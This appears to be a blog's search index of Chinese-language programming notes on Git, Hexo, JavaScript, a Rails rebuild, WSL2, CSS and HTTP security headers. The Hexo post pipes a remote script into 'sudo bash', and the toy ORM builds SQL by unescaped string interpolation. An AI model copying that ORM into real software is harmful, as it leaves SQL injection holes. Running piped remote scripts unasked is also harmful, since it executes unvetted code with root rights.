MD5","categories":["Windows","Tips"]},{"title":"github-without-pw","url":"/2020/4/github-without-pw/","content":"紀錄一下步驟，不然每次都忘記\n\n\n先用ssh-keygen生出公私鑰\n用cat把公鑰內容抓出來\n到github的Setting，再到SSH and GPG keys\n點New SSH Key把cat的內容貼上去\n\n如果是走https就是用帳密。\n而帳密也是有儲存方法的叫Store Credentials\nsudo apt-get install libsecret-1-0 libsecret-1-devcd /usr/share/doc/git/contrib/credential/libsecretsudo makegit config --global credential.helper /usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret\nOn windows use this instead\n","categories":["Utils","Git"]},{"title":"hexo-blog-and-github-page","url":"/2020/4/hexo-blog-and-github-page/","content":"Install nodejs\ncurl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash -sudo apt-get install -y nodejs\nUse custom node_moudle to avoid access denied\nmkdir ~/.npm-globalnpm config set prefix &#x27;~/.npm-global&#x27;export PATH=~/.npm-global/bin:$PATH\nInstall Hexo\nnpm install hexo-cli -g\nInit blog\nhexo init blog\nTheme :NexT\ngit clone https://github.com/theme-next/hexo-theme-next themes/next\nEnable tags\nremember to add layout: &quot;tags&quot; line\n\nEnable auto_excerpt\nnpm install hexo-excerpt --save\nAdd following lines\nauto_excerpt:  enable: true  length: 50\nRef\nnodejs install README\nResolving EACCES permissions errors\ncomplete ref\n","categories":["Utils","Small project","CI","Tips"]},{"title":"JS一些概念的整理","url":"/2020/4/js-concepts/","content":"hoisting\nconsole.log(a)var a = 10\n會變成類似(會說是類似，因為底層不一定是這樣做)\nvar aconsole.log(a)a = 10\n可以把他\nvar a = &#x27;1&#x27;// A...var b = 2// B ...var c \n想像成這樣\nfunction whatever(a,b,c) &#123;  // A ...  // B ...&#125;(&#x27;1&#x27;,1,undefined);\n如果有let\nvar a = &#x27;1&#x27;function x() &#123;  // a ...  let a = 2&#125;\n先想像成\nfunction whatever(a) &#123;  function x() &#123;    // a ...    let a = 2    // b ...  &#125;&#125;(&#x27;1&#x27;)\n再想像成let會把前面提到同樣變數砍掉，在let的地方展開成function apply\nvar a = &#x27;1&#x27;function whatever() &#123;  function x() &#123;    // a ...    function whatever2(a) &#123;      // b ...    &#125;(2)  &#125;&#125;(&#x27;1&#x27;)\n在Scheme怎麼處理mutual recursion?\n據說當初JS有hoisting是為了方便寫mutual recursion。\n先不說mutual recursion平常很少用到，先來看看scheme(或ML家族語言)是如何處理mutual recursion\n有一個東西叫letrec\n(letrec  [(even? (lambda (x)            (if (zero? x)                #t                (odd? (- x 1)))))  (odd?   (lambda (x)            (if (zero? x)                #f                (even? (- x 1)))))]  even?)\n在這個範圍都是可以互相參照的，個人比較偏好這種方式啦\n例子\n(function() &#123;  var a = b = 5;&#125;)(); console.log(b);\nb會是global!!\n所以印出5\n同理\nfor (var i=0;i&lt;10;i++)   console.log(i)console.log(i)\n最後會是10\n還有function也會hoisting\nfunction test() &#123;   console.log(a);   console.log(foo());       var a = 1;   function foo() &#123;      return 2;   &#125;&#125;test()\n會印\nundefined\n2\nRef\n很詳細的文章\nbuiltin type\n\nstring 是 Immutable\n\n字面常數是value type\nnew的是reference type\n字面常數與new出來的不同\n字面常數不能加method上去\n\n\n\nvar s = &#x27;abc&#x27;;var s2 = s.slice(); // &#x27;abc&#x27; (a clone)s == s2 // truevar s3 = new String(s); // objectvar s4 = new String(s); // objects3 == s4 // false// 用 === 從可怕的隱式轉換拯救自己\n\n\nundefined就是undefined(c的void)\n\n\nnull是object\n\n\nfalsy value\n\nfalse\n0\n‘’\nnull\nundefined\nNaN\n\n\n\n&#x27;&#x27; == &#x27;0&#x27; // false&#x27;&#x27; == 0 // true&#x27;0&#x27; == 0 // true&#x27; \\t\\r\\n&#x27; == 0 // truefalse == &#x27;false&#x27; // falsefalse == 0 // truefalse == undefined // falsefalse == null // falsenull == undefined // trueNaN == NaN // false\nevent bubbling\n\n從樹根往下走，走到終點，只有終點的事件，會執行冒泡與捕獲的事件，其他都是看在什麼階段就執行什麼階段的事件。\n如果是終點有設定冒泡與捕獲的事件，那事件的執行順序，就看當初加入事件的順序\n斬斷鎖鏈\ne.stopPropagation (單體攻擊)\n// list 的捕獲 $list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopPropagation(); // &lt;--- 這邊這事件就不會繼續下去&#125;, true)// list 的捕獲 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;); // &lt;--- 這邊 會 繼續下去&#125;, true)\ne.stopImmediatePropagation (AOE)\n// list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopImmediatePropagation(); // &lt;--- 會讓同一層的所有事件停止&#125;, true)// list 的捕獲 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;);&#125;, true)\ne.preventDefault (AOE ver.針對browser)\n// list_item_link 的冒泡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  e.preventDefault();&#125;, false)\n當點超連結的時候，就不會執行原本預設的行為（新開分頁或是跳轉），而是沒有任何事情發生。\nprototype &amp; interface\nfunction newObj(Constructor, arguments) &#123;  var o = new Object();  // 讓 o 繼承原型鍊  o.__proto__ = Constructor.prototype;  // 執行建構函式  Constructor.apply(o, arguments);  // 回傳建立好的物件  return o;&#125;\n可以想像成Constructor.prototype是class變數與方法的env\n__proto__就是parent的指標\n用apply完成填值的動作\n另外，apply與call都是差不多的東西，只是一個是放參數列，一個是給array\nbind就是會先綁定this成某個Object，只後丟出function\n","categories":["Javascript","FAQ"]},{"title":"Rebuilding Rails的心得","url":"/2020/4/rebuilding-rails-note/","content":"Ch1 Zero to “It Works!”\nGem的檔案結構\n$ bundle gem rulers    create rulers/Gemfile    create rulers/Rakefile    create rulers/LICENSE.txt    create rulers/README.md    create rulers/.gitignore    create rulers/rulers.gemspec # !!    create rulers/lib/rulers.rb  # !!    create rulers/lib/rulers/version.rbInitializating git repo in src/rulers\nrulers/rulers.gemspec放的是gem的資訊與dependency\nrulers/lib/rulers.rb就是主程式\n\ndependency分成development與runtime\n# rulers.gemspecgem.add_development_dependency &quot;rspec&quot;gem.add_runtime_dependency &quot;rest-client&quot;\nrack進入點 與 rack app回傳值的資料結構\n# best_quotes/config.rurun proc &#123;    [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [&quot;Hello, world!&quot;]]&#125;\n狀態值,header,資料\nrack app 的 interface\n# rulers/lib/rulers.rbrequire &quot;rulers/version&quot;module Rulers    class Application        def call(env)            [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [&quot;Hello from Ruby on Rulers!&quot;]]        end    endend\n要有call的method，吃的是來自rack的env\nnew是編譯期的args，call是runtime的args\n# best_quotes/config.rurequire &#x27;./config/application&#x27;run BestQuotes::Application.new\nCh2 Your First Controller\n# rulers/lib/rulers.rbrequire &quot;rulers/version&quot;require &quot;rulers/routing&quot;module Rulersclass Application   def call(env)     klass, act = get_controller_and_action(env)     controller = klass.new(env)     text = controller.send(act)     [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [text]]   end    def get_controller_and_action(env)     _, cont, action, after = env[&quot;PATH_INFO&quot;].split(&#x27;/&#x27;, 4)     cont = cont.capitalize # &quot;People&quot;     cont += &quot;Controller&quot; # &quot;PeopleController&quot;     [Object.const_get(cont), action]   endendclass Controller   def initialize(env)     @env = env   end   def env     @env   endendend\n觀察\n\nget_controller_and_action :: env -&gt; (Class, Symbol)\nController :: env -&gt; obj(一堆action)\n\nCh3 Rails Automatic Loading\nconst_missing\nclass Object    def self.const_missing(c)    require &quot;./bobo&quot;    Bobo    endendBobo.new.print_bobo\nCamelCase and snake_case\n# rulers/lib/rulers/util.rbmodule Rulers    def self.to_underscore(string)        string.gsub(/::/, &#x27;/&#x27;).        gsub(/([A-Z]+)([A-Z][a-z])/,&#x27;\\1_\\2&#x27;).        gsub(/([a-z\\d])([A-Z])/,&#x27;\\1_\\2&#x27;).        tr(&quot;-&quot;, &quot;_&quot;).        downcase    endend\nauto-load\n# rulers/lib/rulers/dependencies.rbclass Object    def self.const_missing(c)        require Rulers.to_underscore(c.to_s)        Object.const_get(c)    endend# best_quotes/config/application.rbrequire &quot;rulers&quot;$LOAD_PATH &lt;&lt; File.join(File.dirname(__FILE__),&quot;..&quot;, &quot;app&quot;,&quot;controllers&quot;) #require要的# --&gt; No more require here! &lt;--module BestQuotes    class Application &lt; Rulers::Application    endend\nCh4 Rendering Views\nerb\n# some_directory/erb_test.rbrequire &quot;erubis&quot;template = &lt;&lt;TEMPLATE    Hello! This is a template.    It has &lt;%= whatever %&gt;.TEMPLATEeruby = Erubis::Eruby.new(template)puts eruby.srcputs &quot;==========&quot;puts eruby.result(:whatever =&gt; &quot;ponies!&quot;)\n\n_buf = &#x27;&#x27;;_buf &lt;&lt; &#x27;Hello!   This is a template. It has &#x27;;_buf &lt;&lt; ( whatever ).to_s; _buf &lt;&lt; &#x27;.&#x27;;_buf.to_s\n==========\nHello! This is a template.It has ponies!.\nrender\n# rulers/lib/rulers/controller.rb (excerpt)def render(view_name, locals = &#123;&#125;)    filename = File.join &quot;app&quot;, &quot;views&quot;,&quot;#&#123;view_name&#125;.html.erb&quot;    template = File.read filename    eruby = Erubis::Eruby.new(template)    eruby.result locals.merge(:env =&gt; env)end\nlocals是controller的資料\nenv是來自rack的資料\n觀察\n\nparse -&gt; proc having lots of string -&gt; eval -&gt; string\n\nCh5 Basic Models\nskip\nCh6 Request, Response\nRequest\nmodule Rulers    class Controller        def request            @request ||= Rack::Request.new(@env)        end        def params            request.params        end    endend\n從 env 得到 Request 再從中得到 params\nResponse\nmodule Rulers    class Controller        #private        def response(text, status = 200, headers = &#123;&#125;)            raise &quot;Already responded!&quot; if @response            a = [text].flatten            @response = Rack::Response.new(a, status, headers)        end        def render(view_name, locals = &#123;&#125;)            filename = File.join &quot;app&quot;, &quot;views&quot;,&quot;#&#123;view_name&#125;.html.erb&quot;            template = File.read filename            eruby = Erubis::Eruby.new(template)            eruby.result locals.merge(:env =&gt; env)        end        #public        def get_response # Only for Rulers            @response        end        def render_response(*args)            response(render(*args))        end    endend\nresponse產生three tuple，就是rack app真正要回傳的東西\nCh7 The Littlest ORM\nMigration 之後，DB做事之前\n# best_quotes/mini_migration.rbrequire &quot;sqlite3&quot;conn = SQLite3::Database.new &quot;test.db&quot;conn.execute &lt;&lt;SQLcreate table my_table ( id INTEGER PRIMARY KEY, posted INTEGER, title VARCHAR(30), body VARCHAR(32000));SQL\nModel\n# rulers/lib/rulers/sqlite_model.rbrequire &quot;sqlite3&quot;require &quot;rulers/util&quot;DB = SQLite3::Database.new &quot;test.db&quot;module Rulers    module Model        class SQLite            def initialize(data = nil)                @hash = data            end            # table&#x27;s meta data            def self.table                Rulers.to_underscore name            end            def self.schema                return @schema if @schema                @schema = &#123;&#125;                DB.table_info(table) do |row|                    @schema[row[&quot;name&quot;]] = row[&quot;type&quot;]                end                @schema            end            # ruby val -&gt; sql&#x27;s ds in ruby string            def self.to_sql(val)                case val                    when Numeric                        val.to_s                    when String                        &quot;&#x27;#&#123;val&#125;&#x27;&quot;                    else                        raise &quot;Can&#x27;t change #&#123;val.class&#125; to SQL!&quot;                end            end            # 產生新model for a row            def self.create(values)                values.delete &quot;id&quot;                keys = schema.keys - [&quot;id&quot;]                vals = keys.map do |key|                    values[key] ? to_sql(values[key]) : &quot;null&quot;                end                DB.execute &lt;&lt;SQL                    INSERT INTO #&#123;table&#125; (#&#123;keys.join &quot;,&quot;&#125;)                    VALUES (#&#123;vals.join &quot;,&quot;&#125;);                SQL                data = Hash[keys.zip vals]                sql = &quot;SELECT last_insert_rowid();&quot;                data[&quot;id&quot;] = DB.execute(sql)[0][0]                self.new data            end            def self.find(id)                row = DB.execute &lt;&lt;SQL                    select #&#123;schema.keys.join &quot;,&quot;&#125; from #&#123;table&#125;                    where id = #&#123;id&#125;;                SQL                data = Hash[schema.keys.zip row[0]]                self.new data            end            # operate on DB directly            def self.count                DB.execute(&lt;&lt;SQL)[0][0]                    SELECT COUNT(*) FROM #&#123;table&#125;                SQL            end            def save!                unless @hash[&quot;id&quot;]                    self.class.create                    return true                end                fields = @hash.map do |k, v|                &quot;#&#123;k&#125;=#&#123;self.class.to_sql(v)&#125;&quot;                end.join &quot;,&quot;                DB.execute &lt;&lt;SQL                    UPDATE #&#123;self.class.table&#125;                    SET #&#123;fields&#125;                    WHERE id = #&#123;@hash[&quot;id&quot;]&#125;                SQL                true            end            def save                self.save! rescue false            end            # operate on model&#x27;s hash (no DB business)            def [](name)                @hash[name.to_s]            end            def []=(name, value)                @hash[name.to_s] = value            end        end    endend\nmethod_missing &amp; define_method\nModel的accessor!!\nclass MyClass    [&quot;foo&quot;, &quot;bar&quot;].each do |method|        define_method(method) &#123;            puts &quot;Obj #&#123;method&#125;&quot;        &#125;    endendmyobj = MyClass.newmyobj.foomyobj.bar\nWhen you call a method that doesnʼt exist on an object, its method called “method_missing” will be called to tell it so.\nIf you override method_missing to check for column names, you can instead just return the column value from method_missing, which will return it from the original call.\nCh8 Rack Middleware\nrack app的interface(type signature) &amp; 如何疊app\n# sample_dir/config.ruclass Canadianize    def initialize(app, arg = &quot;&quot;)        @app = app # next rack app        @arg = arg # args    end    def call(env) # env -&gt; [ status, headers, content ]        status, headers, content = @app.call(env)        content[0] += @arg + &quot;, eh?&quot;         [ status, headers, content ]    endenduse Canadianize, &quot;, simple&quot;run proc &#123;    [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [&quot;Hello, world&quot;]]&#125;\nmap\n# sample_dir/config.rurequire &quot;rack/lobster&quot;use Rack::ContentTypemap &quot;/lobster&quot; do    use Rack::ShowExceptions    run Rack::Lobster.newendmap &quot;/lobster/but_not&quot; do    run proc &#123;        [200, &#123;&#125;, [&quot;Really not a lobster&quot;]]    &#125;endrun proc &#123;    [200, &#123;&#125;, [&quot;Not a lobster&quot;]]&#125;\nIf thereʼs could be two that match, the longer path is checked first.\nCh9 Real Routing\nController Actions are Rack Apps\nBefore\nmodule Rulers class Application    def call(env)        if env[&#x27;PATH_INFO&#x27;] == &#x27;/favicon.ico&#x27;            return [404, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, []]        end        klass, act = get_controller_and_action(env)        controller = klass.new(env) # get env from the previous line, so this line should be eliminated        text = controller.send(act) # should not expose how to execute an action        if controller.get_response # this is controller(rack app)&#x27;s responsibility            st, hd, rs = controller.get_response.to_a            [st, hd, [rs.body].flatten]        else            [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [text]]        end        # rack_app = klass.action(act)        # rack_app.call(env)    end endend\nAfter\n# rulers/lib/rulers.rbmodule Rulers class Application    def call(env)        if env[&#x27;PATH_INFO&#x27;] == &#x27;/favicon.ico&#x27;            return [404, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, []]        end        klass, act = get_controller_and_action(env)        rack_app = klass.action(act)        rack_app.call(env)    end endend# rulers/lib/rulers/controller.rbmodule Rulers    class Controller        include Rulers::Model        def initialize(env)            @env = env            @routing_params = &#123;&#125; # Add this line!        end        def dispatch(action, routing_params = &#123;&#125;)            @routing_params = routing_params            text = self.send(action)            if get_response                st, hd, rs = get_response.to_a                [st, hd, [rs].flatten]            else                [200, &#123;&#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27;&#125;, [text].flatten]            end        end        def self.action(act, rp = &#123;&#125;)            proc &#123; |e| self.new(e).dispatch(act, rp) &#125;        end        def params            request.params.merge @routing_params        end    endend\nRoute 也就是 match\nUsuge\n# best_quotes/config.rurequire &quot;./config/application&quot;app = BestQuotes::Application.newuse Rack::ContentTypeapp.route do    match &quot;&quot;, &quot;quotes#index&quot;    match &quot;sub-app&quot;, proc &#123; [200, &#123;&#125;, [&quot;Hello, sub-app!&quot;]] &#125;    # default routes    match &quot;:controller/:id/:action&quot;    match &quot;:controller/:id&quot;, :default =&gt; &#123; &quot;action&quot; =&gt; &quot;show&quot; &#125;    match &quot;:controller&quot;, :default =&gt; &#123; &quot;action&quot; =&gt; &quot;index&quot; &#125;endrun app\nmatch &amp; routeObject\n# rulers/lib/rulers/routing.rbclass RouteObject    def initialize        @rules = []    end    def match(url, *args)        options = &#123;&#125;        options = args.pop if args[-1].is_a?(Hash)        options[:default] ||= &#123;&#125;        dest = nil        dest = args.pop if args.size &gt; 0        raise &quot;Too many args!&quot; if args.size &gt; 0        parts = url.split(&quot;/&quot;)        parts.select! &#123; |p| !p.empty? &#125;        vars = []        regexp_parts = parts.map do |part|            if part[0] == &quot;:&quot;                vars &lt;&lt; part[1..-1]                &quot;([a-zA-Z0-9]+)&quot;            elsif part[0] == &quot;*&quot;                vars &lt;&lt; part[1..-1]                &quot;(.*)&quot;            else                part            end        end        regexp = regexp_parts.join(&quot;/&quot;)        @rules.push(&#123;            :regexp =&gt; Regexp.new(&quot;^/#&#123;regexp&#125;$&quot;),            :vars =&gt; vars,            :dest =&gt; dest,            :options =&gt; options,        &#125;)    end    def check_url(url)        @rules.each do |r|            m = r[:regexp].match(url)            if m                options = r[:options]                params = options[:default].dup                r[:vars].each_with_index do |v, i|                params[v] = m.captures[i]            end                dest = nil                if r[:dest]                    return get_dest(r[:dest], params)                else                    controller = params[&quot;controller&quot;]                    action = params[&quot;action&quot;]                    return get_dest(&quot;#&#123;controller&#125;&quot; +                    &quot;##&#123;action&#125;&quot;, params)                end            end        end        nil    end    def get_dest(dest, routing_params = &#123;&#125;)        return dest if dest.respond_to?(:call)        if dest =~ /^([^#]+)#([^#]+)$/            name = $1.capitalize            cont = Object.const_get(&quot;#&#123;name&#125;Controller&quot;)            return cont.action($2, routing_params)        end        raise &quot;No destination: #&#123;dest.inspect&#125;!&quot;    endend# And now, the Application:module Rulers class Application    def route(&amp;block)        @route_obj ||= RouteObject.new        @route_obj.instance_eval(&amp;block)    end    def get_rack_app(env)        raise &quot;No routes!&quot; unless @route_obj        @route_obj.check_url env[&quot;PATH_INFO&quot;]    end endend\nConclusion\nfrom env to res\nenv -&gt; router -&gt; Controller -----------------------&gt; (Real)Controller -&gt; res                    / \\               / \\                     |                 |                    env       req -&gt; parmas                              / \\     / \\                               |       |                              env    router                                      / \\                                       |                                      env\n基本上這本書的九個把Rails的核心精神都帶到了，這裡是縮減版的rails與上面的很像，不過某些部分多了一些包裝。\nAppendix: Unobtrusive JavaScript\nJavaScript 不再需要與 HTML 混在一起\n原本是\n&lt;input type=&quot;text&quot; name=&quot;date&quot; onchange=&quot;validateDate()&quot;/&gt;\n變成\n&lt;input type=&quot;text&quot; name=&quot;date&quot; id=&quot;date&quot; /&gt;\nwindow.addEventListener(&quot;DOMContentLoaded&quot;，function（event）&#123;    document.getElementById(&#x27;date&#x27;).addEventListener(&quot;change&quot;，validateDate);&#125;);\n先找出要的DOM，之後再JS中設定該DOM。\n找出要的DOM，可透過id或class，甚至是DOM的traversal\n原本但是找到之後，要怎麼儲存這個DOM的狀態??\n原本都是在JS中來保存，但這樣就會變成DOM的狀態與程式邏輯的狀態會混在一起。\n所以之後有了data attributes!!\n","categories":["Rails","Reading"]},{"title":"ubuntu-mirror","url":"/2020/4/ubuntu-mirror/","content":"灌了ubuntu第一件事，不是更新，是換一個快的mirror\n\nscript\n#! /bin/bashnew=free.nchc.org.twold=$(cat /etc/apt/sources.list | grep main | awk &#x27;&#123; print $2 &#125;&#x27; | cut -d&#x27;/&#x27; -f3 | sed -n &#x27;3P&#x27;)sudo sed -i &quot;s/$old/$new/g&quot; /etc/apt/sources.listsudo sed -i &quot;s/security.ubuntu.com/$new/g&quot; /etc/apt/sources.listsudo apt update\nbash的複習: 各種expansion\n給個變數\nhi=123\nArithmetic expansion\n\nVariables expansion\n單雙引號不一樣\n\n最通用的\n\nCommand expansion\n\nRef\nbash的資料\n改mirror的資料\n","categories":["System","Linux","Tips"]},{"title":"WSL2","url":"/2020/4/wsl2/","content":"介紹\n\nwsl就是轉譯來自linux distr的命令，但是兩個不同的OS看待資源、設計思維都不同，所以其實有些system call不能用還有其他問題，像我是遇到32位元的程式不能用。\n\n\n\nwsl2客製一個適合wsl運行的linux kernel，同時開個小VM運行，這樣就不用煩惱翻譯的問題。\n下圖就是完整架構圖，等有空再回來看。\n\n安裝\n加入 Windows 測試人員計畫\n\nWSL 2 僅適用於 Windows 10 組建 18917 或更高版本\n\n要符合的上面的條件，不是等2020發布，就是加入 Windows 測試人員計畫。\nhere\n裝WSL與虛擬機器平台\n在powershell中(要系統管理員)，打下面的指令後，重開機。\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n更新kernel\n我裝完要切成wsl2的時候，powershell提示要更新，如果需要再從下面的連接載安裝檔吧\nhere\n預設用wsl2\n在powershell中(要系統管理員)，打下面的指令\nwsl --set-default-version 2\n裝linux distr\n從 Microsoft Store 下載並安裝\n\n按get\n\n好用的小程式\nwslgit\n透過wsl的git，讓windows可以用git。\n要裝Microsoft Visual C++ Redistributable for Visual Studio 2017\n安裝很簡單，把上面的C++ Redistr裝完，把github上的wslgit.exe載下來就好。\n如果要讓vscode可以用就去調git path。\n如果不想調vscode的git path(像我一樣懶)，就把wslgit.exe放到圖中的隨便一個路徑，並重新命名成git.exe\n\nwsl-open\n把xdg-open連接到windows的相對應的啟動程式。\n用Standalone的方式裝就好\nWindows Terminal\n這是順便放上來的\n可以一次整合pwoershell,cmd,wsl到一個視窗，同時還有multi-tabs\n安裝就從store下載就好\nMicrosoft Store\n所以要怎麼copy-paste\nctrl + shift + cctrl + shift + v\nRef\nWSL2的安裝指示\nWSL的安裝指南\nWSL2的conf介紹\n","categories":["Windows","Tips"]},{"title":"在不同context下的sync與async(與block&non-block比較)","url":"/2020/5/block-nonblock-sync-async/","content":"caller: block &amp; nonblock\ncaller會等 =&gt; block\ncaller不等 =&gt; nonblock (所以要自己時不是去確認好了沒，或是，callee通知)\nreturn val: (general’s) sync &amp; async\n調用後會拿到\nsync: 我們想要的資料\nasync: 類似raincheck的東西，也許馬上，也許要一段時間後，才會拿到我們想要的資料\n要不要自己把copy到userspace的io做完: (NP’s) sync &amp; async\n\n前面4種都是最後要自己call system call拉資料，所以是sync，最後user與kernel的任務會同時完成\nasync io是user連什麼時候完成都不知道，等到kernel把資料copy好就會call callback\nAJAX\nvar httpRequest = httpRequest = new XMLHttpRequest();httpRequest.onreadystatechange = function() &#123;    // 等狀態變成請求完成狀態    if (httpRequest.readyState === 4 &amp;&amp; httpRequest.status == 200) &#123;        httpRequest.responseText    &#125;    alert(`ERROR - server status code: $&#123;httpRequest.status&#125; xdr status: $&#123;httpRequest.readyState&#125;`);&#125;;httpRequest.open(&#x27;GET&#x27;, &#x27;/api/get_something&#x27;);httpRequest.send(null);httpRequest.open(&#x27;POST&#x27;, &#x27;/api/test.php&#x27;);httpRequest.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;); // 注意CORShttpRequest.send(`name=value&amp;anothername=$&#123;encodeURIComponent(myVar)&#125;&amp;so=on`);\nfetch API\nfunction postData(url, data) &#123;  // Default options are marked with *  return fetch(url, &#123;    body: JSON.stringify(data), // must match &#x27;Content-Type&#x27; header, and data can be `string` or &#123;object&#125;!    cache: &#x27;no-cache&#x27;, // *default, no-cache, reload, force-cache, only-if-cached    credentials: &#x27;same-origin&#x27;, // include, same-origin, *omit    headers: &#123;      &#x27;user-agent&#x27;: &#x27;Mozilla/4.0 MDN Example&#x27;,      &#x27;content-type&#x27;: &#x27;application/json&#x27;    &#125;,    method: &#x27;POST&#x27;, // *GET, POST, PUT, DELETE, etc.    mode: &#x27;cors&#x27;, // no-cors, cors, *same-origin    redirect: &#x27;follow&#x27;, // manual, *follow, error    referrer: &#x27;no-referrer&#x27;, // *client, no-referrer    credentials: &#x27;omit&#x27;, // same-origin, include  &#125;)  .then(response =&gt; response.json()) // 輸出成 json&#125;\nformdata\nvar formData = new FormData();var fileField = document.querySelector(&quot;input[type=&#x27;file&#x27;]&quot;);formData.append(&#x27;username&#x27;, &#x27;abc123&#x27;);formData.append(&#x27;avatar&#x27;, fileField.files[0]);\ncustom headers\nvar myHeaders = new Headers();myHeaders = new Headers(&#123;  &quot;Content-Type&quot;: &quot;text/plain&quot;,  &quot;Content-Length&quot;: content.length.toString(),  &quot;X-Custom-Header&quot;: &quot;ProcessThisImmediately&quot;,&#125;);myHeaders.append(&quot;Content-Type&quot;, &quot;text/plain&quot;);\ncustom request\nvar myInit = &#123; method: &#x27;GET&#x27;,               headers: myHeaders,               mode: &#x27;cors&#x27;,               cache: &#x27;default&#x27; &#125;;var myRequest = new Request(&#x27;flowers.jpg&#x27;, myInit);fetch(myRequest).then(function(response) &#123;  return response.blob();&#125;).then(function(myBlob) &#123;  var objectURL = URL.createObjectURL(myBlob);  myImage.src = objectURL;&#125;);\nRef\nMDN\n比較general的sync\n比較np的sync\n","categories":["Javascript","FAQ"]},{"title":"css BEM","url":"/2020/5/css-bem/","content":"因為css沒有封裝的功能，所以勢必得想辦法處理封裝\n所以有了像 css-in-js、vue的&lt;style scoped&gt;、css moudle、sass之類的preprocessor\n但是封裝後，要思考的就是如何與其他被封裝的code合作(reuse)\n但說老實的讓人眼睛為之一亮的真的不多\n甚至還出現了像functional css的產物\n如果不想用剛剛提到的很潮的東西，還想再vanilla css中生活，那就只能從命名方法下手\nCSS class的命名方法: BEM\n以區塊（Block）、元素（Element）和修飾子（Modifier,state）命名\n.block &#123;&#125;.block-element &#123;&#125;.block-element_modifier &#123;&#125;\n核心原則是把DOM的關係呈現在class上，同時把state分出來\n例子\n&lt;ul class=&quot;menu&quot;&gt;  &lt;li class=&quot;menu__item&quot;&gt;首頁&lt;/li&gt;  &lt;li class=&quot;menu__item menu__item--active&quot;&gt;關於我&lt;/li&gt;  &lt;li class=&quot;menu__item&quot;&gt;分類&lt;/li&gt;&lt;/ul&gt;\n但感覺這只是給人看的，如果要寫CSS應該要有類似OO語言的extend與implements之類的部分，在最後輸出CSS時，再用這種命名方式來展現在整個網頁中的相對關係\nRef\nSource\n","categories":["CSS","Tips"]},{"title":"css的z-index與position","url":"/2020/5/css-z-index-position/","content":"z-index是怎麼來的\n東西疊上去就會有z軸\n要疊上去一定要地基(stacking context，如果你愛術語的話)，那地基如何產生?\n地基如何產生?\n\n根元素（&lt;html&gt;&lt;/html&gt;）\nposition 設定成 fixed 或 sticky\nposition 設定成 relative 或 absolute &amp; 有設定 z-index\n有設定 transform 屬性\nopacity 的值設定小於 1\n\n如果有許多地基，要怎麼辦?\n地基的順序\n\n.nagetive-stack&#123;  position: absolute;  z-index: -1;  width: 200px;  height: 100px;  background-color: pink;  margin-top: -30px;  margin-left: -25px;&#125;.non-inline-level&#123;  height: 100px;  width: 200px;  margin-left: 10px;  color: #fff;  background-color: purple;&#125;.float&#123;  float: left;  width: 60px;  height: 100px;  background-color: red;  margin-top: 30px;&#125;.inline-level&#123;  background-color: blue;  color: #fff;  padding: 30px;  box-sizing: border-box;  width: 200px;  display: inline;  margin-left: -10px;&#125;.zero-stack&#123;  position: absolute;  z-index: 0;  width: 200px;  height: 100px;  background-color: lightgreen;  margin-top: -2px;&#125;.positive-stack&#123;  position: absolute;  z-index: 1;  width: 200px;  height: 100px;  background-color: orange;  margin-top: 50px;  margin-left: 50px;&#125;\n&lt;div class=&quot;float&quot;&gt;4.float&lt;/div&gt;&lt;div class=&quot;nagetive-stack&quot;&gt;2.nagetive-stack&lt;/div&gt;&lt;div class=&quot;non-inline-level&quot;&gt;3.block-level&lt;/div&gt;&lt;div class=&quot;inline-level&quot;&gt;5.inline-level&lt;/div&gt;&lt;div class=&quot;zero-stack&quot;&gt;6.zero-stack&lt;/div&gt;&lt;div class=&quot;positive-stack&quot;&gt;7.positive-stack&lt;/div&gt;\n\nposition &amp; translate\nposition可以用top之類的來調整位置\n那他與translate不同在哪?\n用translate的話，會產生地基，但如果用position卻沒有加上z-index，\n就會與其他原本的居民在一起，到時候如果有top之類的變動，會牽動其他居民一起來(reflow)\n所以要用position與top之類的要記得加上z-index，或是用translate\n","categories":["CSS","FAQ"]},{"title":"有趣的資安header","url":"/2020/5/header-security/","content":"Content Security Policy(CSP)\n列白名單，限制script, style, img, iframe的使用\ndefult就是沒有提到的功能\nContent-Security-Policy: default-src ‘self’; script-src ‘self’ http://js.devco.re; style-src ‘self’ http://css.devco.re; img-src ‘self’ data:; frame-src ‘none’\nRef\nsource\nHTTPS\n就是加密資料與證明之後收到的資料是來自對的server\nQ: 加密的部分相對好理解，但是要怎麼證明收到的資料是來自對的server?\nA: 只要在資料上留下簽名(數位憑證)就好\nQ: 要怎麼證明簽名是對的?\nA: 找保證人(值得信任的人)\n數位憑證認證機構（Certificate Authority，CA）\nQ: 要怎麼證明保證人值得信任?\nA: 保證人能找到更強的保證人來擔保\nQ: 這個有終點嗎? (信任鏈的終點)\nA: 最強的保證人就是各國的政府\n找保證人去註冊自己的簽名，就可以讓大家知道這簽名是我的，\n而驗證與加密就透過公私鑰\nRef\n信任鏈source\nhttpsVShttp\nOWASP Secure Headers\n\nX-Frame-Options : 我的url能不能被用在iframe中\nX-Content-Type-Options : 要不要讓browser猜content-type\nReferrer-Policy : 要不要記下你從哪個url過來的\n\nRef\nsource\nCORS(Cross-origin resource sharing)\n就是只有家人才能拿家中的任何東西，如果其他人要拿要先講好\n怎樣叫一家人? 